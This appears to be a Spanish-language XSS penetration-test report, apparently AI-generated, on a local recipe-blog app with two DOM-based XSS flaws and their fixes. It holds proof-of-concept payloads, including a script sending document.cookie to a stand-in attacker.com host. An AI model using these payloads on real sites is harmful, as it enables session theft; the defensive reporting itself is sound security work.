# Informe de Análisis de Seguridad - Cross-Site Scripting (XSS)

**Fecha:** 2026-04-27T15:35:02  
**Objetivo:** http://web.dev.local:8082  
**Analista:** GitHub Copilot (claude-sonnet-4.6)  
**Tipo de análisis:** Simple (sin autenticación, caja negra)

---

## Resumen Ejecutivo

Se ha realizado un análisis de vulnerabilidades Cross-Site Scripting (XSS) sobre la aplicación web **"Blog de Recetas"** alojada en `http://web.dev.local:8082`. Se han identificado y confirmado **dos vulnerabilidades XSS** de tipo DOM-based que permiten la ejecución de código JavaScript arbitrario en el navegador de la víctima.

| Hallazgo | Tipo | Severidad | Estado |
|----------|------|-----------|--------|
| XSS en parámetro `search` | DOM-based XSS | Alta | Confirmado |
| XSS en sección de comentarios | DOM-based Stored XSS | Alta | Confirmado |

---

## Descripción de la Aplicación

La aplicación es un blog de recetas de cocina que incluye:
- **Sección de búsqueda**: formulario GET con parámetro `search`
- **Sección de comentarios**: formulario GET con parámetros `name` y `comment`; los datos se almacenan en `localStorage` del navegador

---

## Vulnerabilidades Encontradas

### CVE-1: XSS DOM-based en el campo de búsqueda

**Parámetro afectado:** `search` (GET)  
**Severidad:** Alta  
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)

**Descripción:**  
El parámetro `search` es leído directamente desde los parámetros de la URL mediante `URLSearchParams` y escrito en el DOM a través de `document.write()` sin ningún tipo de sanitización ni codificación.

**Código vulnerable:**
```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');

if (searchTerm) {
    // VULNERABLE: searchTerm se inserta sin sanitización
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
}
```

**Vector de ataque (PoC):**
```
http://web.dev.local:8082/?search=<script>alert('XSS_Demostrado')</script>
```

**Payload alternativo (bypass de posibles filtros de `<script>`):**
```
http://web.dev.local:8082/?search=</strong><img src=x onerror=alert(document.cookie)><strong>
```

**HTML resultante inyectado:**
```html
<p>Resultados para: <strong><script>alert('XSS_Demostrado')</script></strong></p>
```

**Impacto:** Un atacante puede enviar un enlace malicioso a una víctima. Al hacer clic, se ejecuta JavaScript en el contexto de la página, permitiendo robo de cookies de sesión, redirección a páginas de phishing, o ejecución de acciones en nombre del usuario.

---

### CVE-2: Stored XSS DOM-based en sección de comentarios

**Parámetros afectados:** `name` y `comment` (GET)  
**Severidad:** Alta  
**CWE:** CWE-79 (Stored XSS)

**Descripción:**  
Los comentarios son recibidos mediante parámetros GET, almacenados en `localStorage` sin sanitización, y posteriormente renderizados mediante `document.write()` sin codificación. Aunque el almacenamiento es local al navegador (no server-side), cualquier payload inyectado persiste en el localStorage del usuario y se ejecuta en cada visita a la página.

**Código vulnerable:**
```javascript
// Almacenamiento sin sanitización
const name = urlParams.get('name');
const comment = urlParams.get('comment');
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));

// Renderizado sin sanitización
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

**Vector de ataque (PoC):**
```
http://web.dev.local:8082/?name=Atacante&comment=<script>alert('Stored_XSS')</script>
```

**Payload de explotación avanzada (robo de cookies):**
```
http://web.dev.local:8082/?name=<img src=x onerror=alert(document.cookie)>&comment=Comentario_normal
```

**Payload de exfiltración de datos:**
```
http://web.dev.local:8082/?name=Admin&comment=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
```

**HTML resultante inyectado:**
```html
<div class="comment-author"><img src=x onerror=alert(document.cookie)></div>
<div><script>alert('Stored_XSS')</script></div>
```

**Impacto:** El payload se almacena en el localStorage del navegador de la víctima y se ejecuta automáticamente en cada visita posterior a la página, sin necesidad de re-enviar el enlace malicioso.

---

## Análisis de Cabeceras de Seguridad

Se verificaron las cabeceras HTTP de respuesta del servidor:

| Cabecera | Estado | Comentario |
|----------|--------|------------|
| `Content-Security-Policy` | **Ausente** | No hay protección contra ejecución de scripts no autorizados |
| `X-XSS-Protection` | **Ausente** | Sin protección adicional del navegador |
| `X-Frame-Options` | **Ausente** | Vulnerable a clickjacking |

La ausencia de Content Security Policy (CSP) amplifica significativamente el impacto de las vulnerabilidades XSS encontradas.

---

## Sinks Inseguros Identificados

| Sink | Variable de entrada | Línea |
|------|---------------------|-------|
| `document.write()` | `searchTerm` (de `urlParams.get('search')`) | Sección búsqueda |
| `document.write()` | `c.name` (de `localStorage`) | Sección comentarios |
| `document.write()` | `c.comment` (de `localStorage`) | Sección comentarios |

---

## Recomendaciones de Mitigación

### 1. Sanitización de entradas (obligatorio)
Implementar codificación HTML para todas las variables que se insertan en el DOM:

```javascript
function escapeHtml(str) {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

// Uso correcto:
document.write('<p>Resultados para: <strong>' + escapeHtml(searchTerm) + '</strong></p>');
```

### 2. Usar APIs seguras del DOM
Reemplazar `document.write()` por métodos seguros:

```javascript
// En lugar de document.write:
const resultDiv = document.createElement('div');
resultDiv.textContent = 'Resultados para: ' + searchTerm; // textContent es seguro
document.querySelector('.search-section').appendChild(resultDiv);
```

### 3. Implementar Content Security Policy
Agregar la cabecera CSP en el servidor:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

### 4. Validación del lado servidor
Implementar backend con validación y sanitización de parámetros antes de procesar cualquier entrada.

---

## Conclusión

La aplicación **"Blog de Recetas"** presenta vulnerabilidades críticas de XSS DOM-based tanto en el buscador como en la sección de comentarios. La causa raíz es el uso de `document.write()` con datos de usuario sin sanitizar. La ausencia de cualquier cabecera de seguridad HTTP agrava el impacto potencial. Se recomienda aplicar las medidas de mitigación descritas con carácter prioritario.

---

*Informe generado automáticamente por análisis de seguridad web*  
*Herramientas utilizadas: curl, análisis estático de código JavaScript*
